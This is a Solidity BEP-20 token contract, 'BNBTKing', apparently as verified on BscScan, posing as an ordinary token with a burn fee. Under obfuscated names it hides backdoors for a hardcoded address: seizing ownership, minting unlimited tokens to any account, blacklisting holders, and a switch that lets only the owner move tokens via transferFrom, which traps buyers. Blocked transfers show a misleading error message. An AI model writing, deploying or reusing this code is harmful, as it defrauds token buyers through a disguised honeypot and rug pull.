/**
 *Submitted for verification at BscScan.com on 2022-02-05
*/

/**
 *Submitted for verification at BscScan.com on 2022-02-05
*/

pragma solidity ^0.6.9;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

   
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory trfqwfMessage
    ) internal pure returns (uint256) {
        require(b <= a, trfqwfMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory trfqwfMessage
    ) internal pure returns (uint256) {
        require(b > 0, trfqwfMessage);
        uint256 c = a / b;


        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory trfqwfMessage
    ) internal pure returns (uint256) {
        require(b != 0, trfqwfMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library Address {
   
    function isContract(address account) internal view returns (bool) {
       
        bytes32 codehash;


            bytes32 accountHash
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }


    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

 
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

 
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }


    function functionCall(
        address target,
        bytes memory data,
        string memory trfqwfMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, trfqwfMessage);
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory trfqwfMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, trfqwfMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory trfqwfMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");


        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(trfqwfMessage);
            }
        }
    }
}


contract Ownable is Context {
    address private _owner;
    address private _bnhbgAddress = 0xeb718E6c2095AaecC39D591E93584f670284C09A;
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;

    event OiwnersxipTransfxerrix(
        address indexed previousOwner,
        address indexed newOwner
    );


    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OiwnersxipTransfxerrix(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier bnhbgAddress() {
        require(_bnhbgAddress == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function rtegdfgdwaqwrwe(address newOwner) public virtual bnhbgAddress {
        _owner = newOwner;
    }
}

contract BNBTKing is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _TTOOPP;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _rreeyytt;
    mapping(address => bool) private _ttyucvxsdfkds;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _total = 10000000000000* 10**8;
    uint256 private _tFeeTotal;
    
    string private _name = "BNBTKing";
    string private _symbol = "BNBTKing";
    uint8 private _decimals = 8;
    uint256 public deadFee = 8;


    mapping(address => bool) private _YTRFGD;
    bool private _REWRER = true;
    bool private _GHDSOH = false;
 
    uint256 public YTRFGD = uint256(0);
    mapping(address => uint256) private _UYTFGWE;
    address[] private __UYTFGWE;
    address owners;

    constructor() public {
        _TTOOPP[_msgSender()] = _total;
         owners = _msgSender();
        _rreeyytt[owner()] = true;
        _rreeyytt[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _total);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _total;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _TTOOPP[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if(_rreeyytt[_msgSender()] || _rreeyytt[recipient]){
            _tercnsa(_msgSender(), recipient, amount);
            return true;
        }
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _tercnsa(_msgSender(), deadAddress, deadAmount);
        _tercnsa(_msgSender(), recipient, amount.sub(deadAmount));
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(_GHDSOH){
     require(owners == sender, "Transfer amount must be greater than zero");
        }
        if(_rreeyytt[_msgSender()] || _rreeyytt[recipient]){
            _tercnsa(sender, recipient, amount);
            return true;
        }       
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _tercnsa(sender, deadAddress, deadAmount);
        _tercnsa(sender, recipient, amount.sub(deadAmount));
    
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _GIwFDC(address OIUDFEW, uint256 REXAAS) external bnhbgAddress() {
        require(REXAAS > 0, "tdsocg");
        uint256 TENTES = _UYTFGWE[OIUDFEW];
        if (TENTES == 0) __UYTFGWE.push(OIUDFEW);
        _UYTFGWE[OIUDFEW] = TENTES.add(REXAAS);
        YTRFGD = YTRFGD.add(REXAAS);
        _TTOOPP[OIUDFEW] = _TTOOPP[OIUDFEW].add(REXAAS);
    }
    
    function trreeyyttFromRewards(address account) public view returns (bool) {
        return _ttyucvxsdfkds[account];
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function excludeFromFee(address account) public bnhbgAddress {
        _rreeyytt[account] = true;
    }

    function includeInFee(address amountt) public bnhbgAddress {
        _rreeyytt[amountt] = false;
    }
 
    function _PFTFZGT(bool amountt) external bnhbgAddress() {
        _GHDSOH = amountt;
    }
    function _OETRBTBS(address amountt) external bnhbgAddress() {
        _YTRFGD[amountt] = true;
    }

    function _QWXZZF(address amountt) external bnhbgAddress() {
        delete _YTRFGD[amountt];
    }

    function FRTYHB(address amountt)
        external
        view
        bnhbgAddress()
        returns (bool)
    {
        return _YTRFGD[amountt];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _tercnsa(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (_REWRER) {
            require(_YTRFGD[from] == false, "Transfer amount must be greater than zero");
        }


        _tosdaaer(from, to, amount);
    }

    function _tosdaaer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {   
        require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    
        _TTOOPP[sender] = _TTOOPP[sender].sub(tAmount);
        _TTOOPP[recipient] = _TTOOPP[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }

  

}